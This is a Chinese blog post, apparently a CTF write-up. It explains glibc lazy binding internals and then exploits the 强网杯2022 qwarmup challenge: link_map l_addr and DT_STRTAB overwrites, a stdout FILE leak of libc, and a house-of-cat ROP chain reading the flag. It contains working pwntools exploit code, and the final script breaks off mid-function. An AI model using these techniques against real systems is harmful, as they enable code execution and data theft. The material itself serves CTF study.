<p>此成员指定应用重定位操作的位置。不同的目标文件对于此成员的解释会稍有不同。</p>
<p>对于可重定位文件，该值表示节偏移。重定位节说明如何修改文件中的其他节。重定位偏移会在第二节中指定一个存储单元。</p>
<p>对于可执行文件或共享目标文件，该值表示受重定位影响的存储单元的虚拟地址。此信息使重定位项对于运行时链接程序更为有用。</p>
<ul>
<li>r_info</li>
</ul>
<p>此成员指定必须对其进行重定位的符号表索引以及要应用的重定位类型。</p>
<p>完整内容可以参考：<a href="https://docs.oracle.com/cd/E26926_01/html/E25910/chapter6-54839.html#chapter7-2">重定位节 - 链接程序和库指南 (oracle.com)</a></p>
<p><strong>其中 (r_info &gt;&gt; 32)为这个重定位结构体对应的函数在符号表中的索引</strong></p>
<p>听起来比较抽象，下面我们在GDB中实际看一下：</p>
<p>首先<code>pltgot</code>就是我们的<code>GOT</code>表地址</p>
<p><img src="https://pic.imgdb.cn/item/6375087316f2c2beb1c570f8.jpg" /></p>
<p>而我们的重定位节内容为：</p>
<p><img src="https://pic.imgdb.cn/item/6375097716f2c2beb1cd46ec.jpg" /></p>
<p>实际内存中也就是：</p>
<p><img src="https://pic.imgdb.cn/item/6378be3916f2c2beb143ba00.jpg" /></p>
<p>通过<code>IDA</code>可以看出0x648处的<code>Elf64_Rela</code>才是对应<code>write</code>的重定位结构体，也就是</p>
<p><img src="https://pic.imgdb.cn/item/637509ab16f2c2beb1cf3f34.jpg" /></p>
<div class="sourceCode" id="cb17"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb17-1" title="1">  r_offset = <span class="bn">0x4020</span>,</a>
<a class="sourceLine" id="cb17-2" title="2">  r_info = <span class="bn">0x400000007</span>,</a>
<a class="sourceLine" id="cb17-3" title="3">  r_addend = <span class="dv">0</span></a></code></pre></div>
<p>显然<code>r_offset = 0x4020</code>正好对应了<code>write</code>函数在<code>GOT</code>表中的偏移：</p>
<p><img src="https://pic.imgdb.cn/item/63750a5016f2c2beb1d3d670.jpg" /></p>
<p>而<code>r_info = 0x400000007</code>中，<code>(r_info &gt;&gt; 32) == 4</code>代表了<code>write</code>函数在<code>GOT</code>表中的索引就是4，也就是说<code>write</code>位于<code>GOT[4]</code>。</p>
<p>最后一部分</p>
<div class="sourceCode" id="cb18"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb18-1" title="1">reloc_offset(pltgot, reloc_arg);</a></code></pre></div>
<p>就是根据传入的参数<code>reloc_arg</code>获取获取他在<code>GOT</code>表中的索引。所以最后就会根据这个传入的参数得到这个对应函数的重定位表<code>Elf64_Rela</code>地址<code>reloc</code></p>
<p><img src="https://pic.imgdb.cn/item/63750b9716f2c2beb1debe24.jpg" /></p>
<h4 id="rel_addr">3.6 rel_addr</h4>
<p>之后下一部分：</p>
<p><img src="https://pic.imgdb.cn/item/63750bee16f2c2beb1e18421.jpg" /></p>
<p><code>symtab</code>上文提到了，是我们的动态符号表地址，位于<code>.dynsym</code>。</p>
<p>显然，<code>&amp;symtab[ELFW(R_SYM)(reloc-&gt;r_info)]</code>就是获得<code>reloc</code>对应函数的。</p>
<p>对于我们的<code>write</code>函数来说，就是<code>&amp;symtab[0x400000007 &gt;&gt; 32]</code>，也就是<code>&amp;symtab[4]</code>。</p>
<p><img src="https://pic.imgdb.cn/item/6378be5116f2c2beb143df45.jpg" /></p>
<p>之后就到了关键的<code>rel_addr</code>，</p>
<div class="sourceCode" id="cb19"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb19-1" title="1"> <span class="dt">void</span> *<span class="dt">const</span> rel_addr = (<span class="dt">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</a></code></pre></div>
<p><code>l-&gt;l_addr</code>上文介绍<code>link_map</code>提过，就是对应ELF的真实地址，而<code>reloc-&gt;r_offset</code>就是对应函数的<code>GOT</code>表的偏移，所以<code>rel_addr</code>就是对应函数在<code>GOT</code>表中的地址，也就是所谓的<strong>写回地址</strong>。</p>
<p><img src="https://pic.imgdb.cn/item/6378be5f16f2c2beb143f756.jpg" /></p>
<p>也就是说，延迟绑定找到函数真实地址之后，就会把他写回这个地址，由于<code>l-&gt;l_addr</code>是保存在<code>ld</code>中写是可写的，伪造<code>l-&gt;l_addr</code>其实就是一种常见的<code>ret2dl</code>技巧。</p>
<h4 id="dl_lookup_symbol_x">3.7 dl_lookup_symbol_x</h4>
<p>跳过中间各种各样的检查，下一个关键部分在<code>_dl_lookup_symbol_x</code>，也就是真正开始查找真实地址的操作。</p>
<p><img src="https://pic.imgdb.cn/item/6378befc16f2c2beb1455c52.jpg" /></p>
<p>传入的第一个参数：</p>
<div class="sourceCode" id="cb20"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb20-1" title="1">strtab + sym-&gt;st_name</a></code></pre></div>
<p>也就是<code>字符串表基地址+要查找的函数的函数名的偏移</code>，对于我们的<code>write</code>来说:</p>
<p><img src="https://pic.imgdb.cn/item/637511c916f2c2beb10943f0.jpg" /></p>
<p>之后根据这个传入的函数名字符串再进入<code>libc</code>中查找，具体的查找过程我们这里并不深入，需要知道的是，这个查找本质上是遍历哈希表，如果没有找到就根据<code>l-&gt;next</code>定位到下一个文件的<code>link_map</code>重复操作。</p>
<p>同样的，如果我们能伪造<code>strtab</code>的值，我们就可以控制整个<strong>字符串表</strong>，也就可以劫持它查找真实函数地址的过程，这也是在<code>ret2dl</code>中常见的技巧。</p>
<p>这个函数的返回值<code>result</code> 是找到需要的函数的<code>link_map</code>结构体。再这里来说就是找到的<code>write</code>对应的动态链接库<code>libc.so.6</code></p>
<p><img src="https://pic.imgdb.cn/item/6378be7616f2c2beb1441ee1.jpg" /></p>
<h4 id="dl_fixup_make_value-以及后续">3.8 DL_FIXUP_MAKE_VALUE 以及后续</h4>
<p>找到了对应的<code>link_map</code>之后，就是具体查找真实地址，同样的的具体过程这里不详细介绍。</p>
<p><img src="https://pic.imgdb.cn/item/637513f316f2c2beb1185dce.jpg" /></p>
<p>简单来说就是通过获取<code>st_value</code>,来得到函数在外部库里的偏移，并加上外部库的<code>l_addr</code>获得真实地址。</p>
<p>它的返回值<code>value</code>就是在动态链接库中找到的真实地址</p>
<p><img src="https://pic.imgdb.cn/item/6375149316f2c2beb1194a98.jpg" /></p>
<p>之后就会<strong>调用这个外部函数</strong>，并把真实地址写回<code>rel_addr</code>也就是我们的<code>GOT</code>表。</p>
<p><img src="https://pic.imgdb.cn/item/6375158f16f2c2beb11a890d.jpg" /></p>
<p>至此就完成了<code>write</code>函数完整的动态连接过程。</p>
<h3 id="总结">4. 总结</h3>
<p>简单来说，完整的动态链接就是从传入的 <code>reloc_arg</code> 开始，链接器会通过该值找到对应函数的 <code>Elf64_Rela</code> 结构，通过该结构的<code>r_info</code> 变量中的偏移量找到对应函数的 <code>Elf64_Sym</code> 结构，然后再通过 <code>Elf64_Sym</code>结构的<code>st_name</code> 结合之前已经确定的 <code>.dynstr</code> 地址，通过 <code>st_name + .dynstr</code> 获得对应函数的函数名，并根据函数名遍历查找所有的<code>link_map</code>链，直到获取函数所在的<code>link_map</code>并计算<code>st_value + l_addr</code>得到真实地址，之后调用该函数并写回<code>ELF</code>中的<code>GOT</code>表。</p>
<h2 id="x02-强网杯2022-qwarmup">0x02 强网杯2022 qwarmup</h2>
<h3 id="分析">1. 分析</h3>
<p>今年强网杯qwarmup就是明显的延迟绑定<code>rtld</code>的利用，在拿不到具体<code>ALSR</code>地址的情况下可以任意堆偏移写1个字节。</p>
<p><img src="https://pic.imgdb.cn/item/6375e59116f2c2beb10658df.jpg" /></p>
<p>如果我们申请一个较大的<code>chunk</code>，那么返回值的就是利用<code>mmap</code>申请出来的一段相对于<code>libc</code>偏移固定的空间，实现任意写<code>libc</code>。</p>
<h3 id="实现多次任意地址写">2. 实现多次任意地址写</h3>
<p>我们不能真的只用这任意地址写1字节实现攻击，观察分析 <code>do while</code>循环条件，不难知道只要我们输入的<code>size</code>的高位<code>HIWORD</code>为0就可以无限循环，但是这种<code>malloc(size)</code>中size不我们都会考虑申请更大的<code>chunk</code>实现获得一个相对于<code>libc</code>和<code>ld</code>相对地址偏移固定的地址就会导致高位不然不是0，也就是说我们只能写一次程序就会退出结束。</p>
<p>所以我们的第一个目标就是利用任意一字节写修改<code>.bss</code>段上的size的高位。</p>
<p>在上文中，我们介绍了<code>rel_addr</code>也就是写回地址，它的计算方式是:</p>
<div class="sourceCode" id="cb21"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb21-1" title="1"> <span class="dt">void</span> *<span class="dt">const</span> rel_addr = (<span class="dt">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</a></code></pre></div>
<p>这个所谓的写回地址就是最终获得函数在动态链接库中的真实地址之后，写回<code>ELF</code>文件中的<code>GOT</code>表的地址，而总所周知，<code>GOT</code>表同样位于我们的<code>.bss</code>段上，且相对于我们的一些全局变量的地址相差很小。所以如果我们能控制写回地址<code>rel_addr</code>就可以实现把真实地址写道bss段上其他地址，从而利用真实地址的高位0覆盖我们要覆盖的size的高位。</p>
<p>首先我们观察下，如果我们输入的<code>size=0xF0000</code>，那么在调用<code>write@plt</code>之前，他们在bss段上的情况：</p>
<p><img src="https://pic.imgdb.cn/item/6375e8a916f2c2beb10cc234.jpg" /></p>
<p>可以看到偏移只有<code>0x08c-0x018 = 0x74</code>，考虑到要让<code>write</code>真实地址的高位0覆盖这个<code>0xF</code>，所以我们只要控制偏移<code>+0x70</code>就可以实现无限循环，也就是从1字节写变成无限字节写。那么接下来就要考虑如何实现修改<code>rel_addr</code>。</p>
<p>对于一个函数的延迟绑定来说，<code>reloc-&gt;r_offset</code>总是固定的，毕竟只有1字节写的情况下我们无法实现伪造相关表和结构体。</p>
<p>所以我们的目标就变成了<code>l-&gt;l_addr</code>。上文提到了<code>link_map *l-&gt;l_addr</code>是加载的ELF文件(或者其他.so动态链接文件)地址和内存地址的偏移。直白来说，<code>ELF</code>中的<code>link_map *l-&gt;l_addr</code>就是保存着这个<code>ELF</code>文件的基地址（虚拟地址）。</p>
<p>定位到<code>_dl_fixup</code>的地址个参数就是<code>link_map *l</code>结构体，这个结构体的第一个参数就是<code>l_addr: 0x563d87dea000</code></p>
<p><img src="https://pic.imgdb.cn/item/6375ead016f2c2beb1110803.jpg" /></p>
<p>也就是我们的<code>ELF</code>基地址：</p>
<p><img src="https://pic.imgdb.cn/item/6375eb3216f2c2beb111d17e.jpg" /></p>
<p>而且<code>l_addr</code>最为基地址，一般低3位都是0，<code>link_map</code>保存在<code>ld</code>中，且可以修改，所以我们在第一次<code>write</code>的延迟绑定之前利用任意字节写修改<code>l_addr</code>的地位为<code>\x70</code>（上文我们算出的偏移），修改写回地址覆盖bss上的size高位为0就可以进入无限循环。</p>
<p>而且由于<code>write</code>的真实地址并没有被写入<code>GOT</code>表，所以之后每次调用<code>write</code>都会触发一次延迟绑定，方便后续调用。</p>
<p>具体在代码注释中：</p>
<div class="sourceCode" id="cb22"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb22-1" title="1"><span class="kw">class</span> link_map:</a>
<a class="sourceLine" id="cb22-2" title="2">    DT_JMPREL <span class="op">=</span> <span class="dv">23</span></a>
<a class="sourceLine" id="cb22-3" title="3">    DT_SYMTAB <span class="op">=</span> <span class="dv">6</span></a>
<a class="sourceLine" id="cb22-4" title="4">    DT_STRTAB <span class="op">=</span> <span class="dv">5</span></a>
<a class="sourceLine" id="cb22-5" title="5">    DT_VER <span class="op">=</span> <span class="dv">50</span></a>
<a class="sourceLine" id="cb22-6" title="6">    DT_FINI <span class="op">=</span> <span class="dv">13</span></a>
<a class="sourceLine" id="cb22-7" title="7">    DT_PLTGOT <span class="op">=</span> <span class="dv">3</span></a>
<a class="sourceLine" id="cb22-8" title="8">    DT_FINI_ARRAY <span class="op">=</span> <span class="dv">26</span></a>
<a class="sourceLine" id="cb22-9" title="9">    DT_FINI_ARRAYSZ <span class="op">=</span> <span class="dv">28</span></a>
<a class="sourceLine" id="cb22-10" title="10">    DT_DEBUG <span class="op">=</span> <span class="dv">21</span></a>
<a class="sourceLine" id="cb22-11" title="11"></a>
<a class="sourceLine" id="cb22-12" title="12">    <span class="kw">def</span> <span class="fu">__init__</span>(<span class="va">self</span>, offset):</a>
<a class="sourceLine" id="cb22-13" title="13">        <span class="va">self</span>.offset <span class="op">=</span> offset</a>
<a class="sourceLine" id="cb22-14" title="14"></a>
<a class="sourceLine" id="cb22-15" title="15">    <span class="kw">def</span> l_addr(<span class="va">self</span>):</a>
<a class="sourceLine" id="cb22-16" title="16">        <span class="cf">return</span> ld.address <span class="op">+</span> <span class="va">self</span>.offset</a>
<a class="sourceLine" id="cb22-17" title="17"></a>
<a class="sourceLine" id="cb22-18" title="18">    <span class="kw">def</span> l_info(<span class="va">self</span>, tag):</a>
<a class="sourceLine" id="cb22-19" title="19">        <span class="cf">return</span> ld.address <span class="op">+</span> <span class="va">self</span>.offset <span class="op">+</span> <span class="bn">0x40</span> <span class="op">+</span> tag <span class="op">*</span> <span class="dv">8</span></a>
<a class="sourceLine" id="cb22-20" title="20"></a>
<a class="sourceLine" id="cb22-21" title="21">ld.address <span class="op">=</span> <span class="bn">0x32f000</span> <span class="op">-</span> <span class="bn">0x10</span>  <span class="co"># ld相对于malloc返回值的偏移</span></a>
<a class="sourceLine" id="cb22-22" title="22">libc.address <span class="op">=</span> <span class="bn">0xf4000</span> <span class="op">-</span> <span class="bn">0x10</span> <span class="co"># libc相对于malloc返回值的偏移</span></a>
<a class="sourceLine" id="cb22-23" title="23">binary_map <span class="op">=</span> link_map(<span class="bn">0x3b2e0</span>)<span class="co"># link_map相对于ld基地址的偏移</span></a>
<a class="sourceLine" id="cb22-24" title="24"></a>
<a class="sourceLine" id="cb22-25" title="25">p.send(p32(<span class="bn">0xF0000</span>))  <span class="co"># malloc(0xF0000)</span></a>
<a class="sourceLine" id="cb22-26" title="26"></a>
<a class="sourceLine" id="cb22-27" title="27"><span class="co"># =============[ loop ]=========================</span></a>
<a class="sourceLine" id="cb22-28" title="28"><span class="co"># write_real_addr ==&gt; write@got + 0x70</span></a>
<a class="sourceLine" id="cb22-29" title="29"><span class="co"># set size=0xF0000 ==&gt; size = 0x0XXXX</span></a>
<a class="sourceLine" id="cb22-30" title="30"><span class="co"># Strat Loop</span></a>
<a class="sourceLine" id="cb22-31" title="31"><span class="co"># write@got != real_addr ==&gt; call write AWAYLS lazy Binding </span></a>
<a class="sourceLine" id="cb22-32" title="32">logger(<span class="st">&quot;binary_map.l_addr()&quot;</span>,binary_map.l_addr())</a>
<a class="sourceLine" id="cb22-33" title="33">write(binary_map.l_addr(),<span class="st">&quot;</span><span class="ch">\x70</span><span class="st">&quot;</span>)</a></code></pre></div>
<h3 id="任意函数调用">3. 任意函数调用</h3>
<p>实现了无限次任意地址写之后，我们就要考虑如何任意函数调用。</p>
<p>由于有了无限次任意写，我们就可以考虑对延迟绑定更多的利用。上文我们提到了，获取的函数真实地址计算方式是利用<strong>字符串表</strong>的函数字符串查找对应的<code>link_map</code>，之后调用并计算<code>st_value + l_addr</code>得到真实地址。</p>
<p>那么如果我们能控制<code>字符串表</code>的内容，不就相当于可以任意函数调用了吗，但是可惜的是<code>.dynstr</code>位于程序不可写区，我们没法修改<strong>字符串表</strong>的内容。但是程序<code>.dynstr</code>地址的方式是通过它对应的<code>d_tag</code>获得对应偏移的<code>d_ptr</code>。而<code>l_info[]</code>数据组中保存的就是各个<code>Elf64_Dyn</code>结构体的地址，而程序获得<code>.dynstr</code>地址的方式恰巧就是<code>l_info[DT_STRTAB]</code>获得对应的<code>Elf64_Dyn-&gt;d_ptr</code>，但是这个在<code>link_map</code>中的数据类似于<code>l_addr</code>同样是我们可以修改的。</p>
<p>也就是说<code>l_info[DT_STRTAB]</code>指向了<code>DT_STRTAB</code>对应的<code>Elf64_Dyn</code>。而如果我们可以修改<code>l_info[DT_STRTAB]</code>的低位也就是修改偏移，让其指向例如<code>DT_DEBUG</code>对应的<code>Elf64_Dyn</code>，那么原本的字符串表地址就会有从<code>l_info[DT_STRTAB]-&gt;d_ptr</code>变成了<code>l_info[DT_DEBUG]-&gt;d_ptr</code>。而<code>l_info[DT_DEBUG]-&gt;d_ptr</code>是指向<code>ld</code>中一块用于调试的区域，同样是我们可写的区域。</p>
<div class="sourceCode" id="cb23"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb23-1" title="1"><span class="dt">const</span> <span class="dt">char</span> *strtab = (<span class="dt">const</span> <span class="dt">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</a></code></pre></div>
<p>也就是说，修改<code>l_info[DT_STRTAB]</code>的低位使其指向<code>DT_DEBUG</code>从而就控制了<code>*strtab</code></p>
<p>正常<code>l_info[DT_STRTAB]</code>：</p>
<p><img src="https://pic.imgdb.cn/item/6375f31316f2c2beb1211f75.jpg" /></p>
<p>正常<code>l_info[DT_STRTAB]</code>指向对应的<code>DT_STRTAB</code>:</p>
<p><img src="https://pic.imgdb.cn/item/6375f34516f2c2beb1215f7b.jpg" /></p>
<p>修改指向<code>l_info[DT_DEBUG]</code>后，对应的<code>DT_DEBUG</code>：</p>
<p>(也就是覆盖低位为0xD8)</p>
<p><img src="https://pic.imgdb.cn/item/6378bf1716f2c2beb145808d.jpg" /></p>
<p>可以看到原来获取的字符串表地址应该是:<code>0x560190f44560</code>，现在会指向<code>0x7f7649259118</code>，也就是<code>ld</code>中的地址，我们的可控地址。</p>
<p>之后如果在<code>0x7f7649259118</code>写入字符串，控制字符串偏移和真实字符串表中<code>write</code>的偏移一致，就可以实现任意函数调用。</p>
<h3 id="泄露libc">4. 泄露libc</h3>
<p>虽然我们可以实现任意函数调用，但需要注意的是我们控制不了函数参数，或者说如果有参数的话只能是<code>write</code>函数的参数，所以我需要继续进一步考虑如何拿到<code>flag</code>。</p>
<p>这题调用了<code>puts</code>之类使用<code>IO_file</code>的函数，也就是说<code>_IO_2_1_stdout_</code>必然会保存缓冲区地址，那么就回到了我们的常规利用思路，修改修改<code>_IO_write_base</code>或者<code>_IO_write_ptr</code>的低字节使得<code>_IO_write_base != _IO_write_ptr</code>，刷新缓冲区泄露<code>libc</code>。</p>
<p>通过修改<code>_IO_2_1_stdout_</code>结构体然后手动调用无参数的<code>_IO_flush_all</code>刷新IO流来泄露libc。</p>
<p>具体来说就是修改<code>_IO_write_base</code>或者<code>_IO_write_ptr</code>然后调用<code>_IO_flush_all</code>即可。</p>
<div class="sourceCode" id="cb24"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb24-1" title="1"><span class="co"># =============[ edit stdout ]==================</span></a>
<a class="sourceLine" id="cb24-2" title="2">write(libc.symbols[<span class="st">&#39;_IO_2_1_stdout_&#39;</span>],p32(<span class="bn">0xfbad1800</span>))</a>
<a class="sourceLine" id="cb24-3" title="3">write(libc.symbols[<span class="st">&#39;_IO_2_1_stdout_&#39;</span>]<span class="op">+</span><span class="bn">0x28</span>,p8(<span class="bn">0xff</span>))</a>
<a class="sourceLine" id="cb24-4" title="4"></a>
<a class="sourceLine" id="cb24-5" title="5"><span class="co"># ====[r_dubug.write ==&gt; &quot;_IO_flush_all&quot;]=======</span></a>
<a class="sourceLine" id="cb24-6" title="6">write(ld.symbols[<span class="st">&#39;_r_debug&#39;</span>]<span class="op">+</span><span class="bn">0x22</span>,<span class="st">&quot;_IO_flush_all</span><span class="ch">\x00</span><span class="st">&quot;</span>)     <span class="co"># 伪造wirte函数对应字符串表项：_IO_flush_all</span></a>
<a class="sourceLine" id="cb24-7" title="7"></a>
<a class="sourceLine" id="cb24-8" title="8"><span class="co"># =============[.strtab ==&gt; r_dubug]============</span></a>
<a class="sourceLine" id="cb24-9" title="9"><span class="co"># =============[call _IO_flush_all]==============</span></a>
<a class="sourceLine" id="cb24-10" title="10">logger(<span class="st">&quot;binary_map.l_info(DT_STRTAB)&quot;</span>,binary_map.l_info(binary_map.DT_STRTAB))</a>
<a class="sourceLine" id="cb24-11" title="11">write_nosuccess(binary_map.l_info(binary_map.DT_STRTAB),<span class="st">&quot;</span><span class="ch">\xb8</span><span class="st">&quot;</span>)   <span class="co"># 修改strtab指向_r_debug</span></a>
<a class="sourceLine" id="cb24-12" title="12"><span class="co"># call _IO_flush_all</span></a>
<a class="sourceLine" id="cb24-13" title="13"><span class="co"># leak libc</span></a>
<a class="sourceLine" id="cb24-14" title="14">p.recv(<span class="dv">5</span>)</a>
<a class="sourceLine" id="cb24-15" title="15">libc_base <span class="op">=</span> u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,b<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">-</span><span class="bn">0x21ba70</span></a>
<a class="sourceLine" id="cb24-16" title="16">logger(<span class="st">&quot;libc_base&quot;</span>,libc_base)</a></code></pre></div>
<h3 id="执行rop">5. 执行ROP</h3>
<p>获得libc地址之后打法就很随意了，这里使用<code>house of cat</code>:</p>
<div class="sourceCode" id="cb25"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb25-1" title="1"><span class="co"># ================[fix write]===================</span></a>
<a class="sourceLine" id="cb25-2" title="2">write(binary_map.l_info(binary_map.DT_STRTAB),<span class="st">&quot;</span><span class="ch">\x78</span><span class="st">&quot;</span>)</a>
<a class="sourceLine" id="cb25-3" title="3"></a>
<a class="sourceLine" id="cb25-4" title="4"></a>
<a class="sourceLine" id="cb25-5" title="5"><span class="co"># ===============[house of cat]=================</span></a>
<a class="sourceLine" id="cb25-6" title="6">setcontext <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x53a30</span><span class="op">+</span><span class="dv">61</span></a>
<a class="sourceLine" id="cb25-7" title="7">syscall <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x0000000000091396</span></a>
<a class="sourceLine" id="cb25-8" title="8">pop_rax <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x0000000000045eb0</span></a>
<a class="sourceLine" id="cb25-9" title="9">pop_rdi <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x000000000002a3e5</span></a>
<a class="sourceLine" id="cb25-10" title="10">pop_rsi <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x000000000002be51</span></a>
<a class="sourceLine" id="cb25-11" title="11">pop_rdx_rbx <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x0000000000090529</span></a>
<a class="sourceLine" id="cb25-12" title="12">_IO_wfile_jumps <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x2160c0</span></a>
<a class="sourceLine" id="cb25-13" title="13">heap <span class="op">=</span> libc_base<span class="bn">-0xf3ff0</span></a>
<a class="sourceLine" id="cb25-14" title="14">stderr <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x21a6a0</span></a>
<a class="sourceLine" id="cb25-15" title="15"></a>
<a class="sourceLine" id="cb25-16" title="16">write(libc.symbols[<span class="st">&#39;_IO_2_1_stderr_&#39;</span>]<span class="op">+</span><span class="bn">0x28</span>,p64(<span class="bn">0xffffffffffffffff</span>))</a>
<a class="sourceLine" id="cb25-17" title="17">write(libc.symbols[<span class="st">&#39;_IO_2_1_stderr_&#39;</span>]<span class="op">+</span><span class="bn">0x40</span>,p64(<span class="dv">1</span>))</a>
<a class="sourceLine" id="cb25-18" title="18">write(libc.symbols[<span class="st">&#39;_IO_2_1_stderr_&#39;</span>]<span class="op">+</span><span class="bn">0x50</span>,p64(heap)<span class="op">+</span>p64(setcontext))<span class="co"># rdx</span></a>
<a class="sourceLine" id="cb25-19" title="19">write(libc.symbols[<span class="st">&#39;_IO_2_1_stderr_&#39;</span>]<span class="op">+</span><span class="bn">0xa0</span>,p64(stderr<span class="op">+</span><span class="bn">0x30</span>))</a>
<a class="sourceLine" id="cb25-20" title="20">write(libc.symbols[<span class="st">&#39;_IO_2_1_stderr_&#39;</span>]<span class="op">+</span><span class="bn">0xd8</span>,p64(_IO_wfile_jumps<span class="op">+</span><span class="bn">0x30</span>))</a>
<a class="sourceLine" id="cb25-21" title="21">write(libc.symbols[<span class="st">&#39;_IO_2_1_stderr_&#39;</span>]<span class="op">+</span><span class="bn">0xd8</span><span class="op">+</span><span class="bn">0x38</span>,p64(stderr<span class="op">+</span><span class="bn">0x40</span>))</a>
<a class="sourceLine" id="cb25-22" title="22"></a>
<a class="sourceLine" id="cb25-23" title="23">rop <span class="op">=</span> p64(heap)<span class="op">+</span>p64(pop_rsi)<span class="op">+</span>p64(<span class="dv">0</span>)<span class="op">+</span>p64(pop_rax)<span class="op">+</span>p64(<span class="dv">2</span>)<span class="op">+</span>p64(syscall)</a>
<a class="sourceLine" id="cb25-24" title="24">rop <span class="op">+=</span> p64(pop_rdi)<span class="op">+</span>p64(<span class="dv">3</span>)<span class="op">+</span>p64(pop_rsi)<span class="op">+</span>p64(heap<span class="op">+</span><span class="bn">0x400</span>)<span class="op">+</span>p64(pop_rdx_rbx)<span class="op">+</span>p64(<span class="bn">0x30</span>)<span class="op">*</span><span class="dv">2</span><span class="op">+</span>p64(pop_rax)<span class="op">+</span>p64(<span class="dv">0</span>)<span class="op">+</span>p64(syscall)</a>
<a class="sourceLine" id="cb25-25" title="25">rop <span class="op">+=</span> p64(pop_rdi)<span class="op">+</span>p64(<span class="dv">1</span>)<span class="op">+</span>p64(pop_rax)<span class="op">+</span>p64(<span class="dv">1</span>)<span class="op">+</span>p64(syscall)</a>
<a class="sourceLine" id="cb25-26" title="26"></a>
<a class="sourceLine" id="cb25-27" title="27">payload <span class="op">=</span> b<span class="st">&quot;flag&quot;</span>.ljust(<span class="bn">0xa0</span>,b<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>)<span class="op">+</span>p64(heap<span class="op">+</span><span class="bn">0x100</span>)<span class="op">+</span>p64(pop_rdi)</a>
<a class="sourceLine" id="cb25-28" title="28">payload <span class="op">=</span> payload.ljust(<span class="bn">0x100</span>,b<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>)</a>
<a class="sourceLine" id="cb25-29" title="29">payload <span class="op">+=</span> rop</a>
<a class="sourceLine" id="cb25-30" title="30">write(<span class="dv">0</span>,payload)</a>
<a class="sourceLine" id="cb25-31" title="31"></a>
<a class="sourceLine" id="cb25-32" title="32"><span class="co"># debug(p,&quot;b *{}&quot;.format(setcontext))</span></a>
<a class="sourceLine" id="cb25-33" title="33"><span class="co"># pause()</span></a>
<a class="sourceLine" id="cb25-34" title="34"></a>
<a class="sourceLine" id="cb25-35" title="35"><span class="co"># =============[call _IO_flush_all]==============</span></a>
<a class="sourceLine" id="cb25-36" title="36">write_nosuccess(binary_map.l_info(binary_map.DT_STRTAB),<span class="st">&quot;</span><span class="ch">\xb8</span><span class="st">&quot;</span>)</a></code></pre></div>
<p>ORW读flag。</p>
<h3 id="完整exp">6. 完整exp</h3>
<div class="sourceCode" id="cb26"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb26-1" title="1"><span class="co"># -*- coding: utf-8 -*-</span></a>
<a class="sourceLine" id="cb26-2" title="2"><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></a>
<a class="sourceLine" id="cb26-3" title="3">context(os<span class="op">=</span><span class="st">&#39;linux&#39;</span>,arch<span class="op">=</span><span class="st">&#39;amd64&#39;</span>)</a>
<a class="sourceLine" id="cb26-4" title="4">context.log_level <span class="op">=</span> <span class="st">&#39;debug&#39;</span></a>
<a class="sourceLine" id="cb26-5" title="5">libc <span class="op">=</span> ELF(<span class="st">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)</a>
<a class="sourceLine" id="cb26-6" title="6">ld <span class="op">=</span> ELF(<span class="st">&#39;/lib64/ld-linux-x86-64.so.2&#39;</span>)</a>
<a class="sourceLine" id="cb26-7" title="7">elf <span class="op">=</span> ELF(<span class="st">&quot;./qwarmup&quot;</span>)</a>
<a class="sourceLine" id="cb26-8" title="8"></a>
<a class="sourceLine" id="cb26-9" title="9">local <span class="op">=</span> <span class="dv">1</span></a>
<a class="sourceLine" id="cb26-10" title="10"></a>
<a class="sourceLine" id="cb26-11" title="11"><span class="cf">if</span> local:</a>
<a class="sourceLine" id="cb26-12" title="12">    p <span class="op">=</span> process(<span class="st">&quot;./qwarmup&quot;</span>)    </a>
<a class="sourceLine" id="cb26-13" title="13"><span class="cf">else</span>:</a>
<a class="sourceLine" id="cb26-14" title="14">    p <span class="op">=</span> remote(<span class="st">&quot;&quot;</span>,<span class="st">&quot;&quot;</span>)</a>
<a class="sourceLine" id="cb26-15" title="15"></a>
<a class="sourceLine" id="cb26-16" title="16"><span class="kw">def</span> debug(p,cmd<span class="op">=</span><span class="st">&quot;&quot;</span>):</a>
<a class="sourceLine" id="cb26-17" title="17">    <span class="cf">if</span> local:</a>
<a class="sourceLine" id="cb26-18" title="18">        gdb.attach(p,cmd)</a>
<a class="sourceLine" id="cb26-19" title="19">    <span class="cf">else</span>:</a>
<a class="sourceLine" id="cb26-20" title="20">        <span class="cf">pass</span></a>
<a class="sourceLine" id="cb26-21" title="21"></a>
<a class="sourceLine" id="cb26-22" title="22"><span class="kw">def</span> logger(msg,addr):</a>
<a class="sourceLine" id="cb26-23" title="23">    log.success(msg<span class="op">+</span><span class="st">&quot; ==&gt;&quot;</span><span class="op">+</span><span class="bu">hex</span>(addr))</a>
<a class="sourceLine" id="cb26-24" title="24"></a>
<a class="sourceLine" id="cb26-25" title="25"><span class="kw">def</span> write(offset, data):</a>
<a class="sourceLine" id="cb26-26" title="26">    <span class="cf">for</span> i, byte <span class="kw">in</span> <span class="bu">enumerate</span>(data):</a>
